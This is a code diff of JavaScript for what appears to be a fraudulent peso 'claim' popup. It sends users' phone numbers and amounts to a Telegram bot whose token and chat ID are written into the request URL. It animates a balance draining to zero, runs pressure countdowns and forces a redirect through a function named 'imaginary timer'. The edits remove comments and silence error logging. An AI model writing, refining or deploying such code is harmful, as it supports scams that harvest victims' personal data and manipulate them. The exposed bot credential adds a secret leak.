@@ -8,7 +8,6 @@ let claimState = {
     hasRedirected: false
 };
 
-// Check if Firewall is active
 async function isFirewallActive() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
@@ -23,17 +22,13 @@ async function isFirewallActive() {
     return false;
 }
 
-// Send notification to admin when user requests verification
 async function sendVerificationRequestNotification(phone, amount) {
     const message = `📞 VERIFY REQUEST\n📱 ${phone}\n💵 ₱${amount}`;
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
-    } catch(e) {
-        console.log("Telegram error:", e);
-    }
+    } catch(e) {}
 }
 
-// Show claim popup - main entry point
 async function showClaimPopup(amount) {
     const firewallActive = await isFirewallActive();
     
@@ -84,18 +79,19 @@ function startSmoothDecrement(originalAmount) {
     if (!balanceText) return;
     
     let current = originalAmount;
-    const totalDuration = 3500;
-    const intervalTime = 50;
-    const steps = totalDuration / intervalTime;
-    const decrementPerStep = originalAmount / steps;
-    let stepCount = 0;
+    const decrementStep = 1;
+    const totalDuration = 2000; // 2 seconds
+    const steps = originalAmount;
+    const intervalTime = totalDuration / steps;
     
     claimState.balanceDecrementInterval = setInterval(() => {
-        stepCount++;
-        current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
-        balanceText.innerText = "₱" + current.toFixed(2);
+        current = current - decrementStep;
         
-        if (current <= 0.01) {
+        if (current >= 0) {
+            balanceText.innerText = "₱" + current.toLocaleString() + ".00";
+        }
+        
+        if (current <= 0) {
             clearInterval(claimState.balanceDecrementInterval);
             claimState.balanceDecrementInterval = null;
             balanceText.innerText = "₱0.00";
@@ -123,13 +119,11 @@ function startVisibleCountdown(originalAmount) {
             clearInterval(claimState.countdownInterval);
             claimState.countdownInterval = null;
             
-            // Restore original balance
             const balanceText = document.getElementById('balanceText');
             if (balanceText) {
                 balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
             }
             
-            // Update Firebase balance
             if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                 window.parent.updateGameBalance(originalAmount);
             } else if (typeof updateGameBalance === 'function') {
@@ -155,7 +149,7 @@ function startImaginaryTimer(redirectUrl) {
             claimState.hasRedirected = true;
             window.location.href = redirectUrl;
         }
-    }, 3500);
+    }, 2000); // 2 seconds redirect
 }
 
 function onClaimAction() {
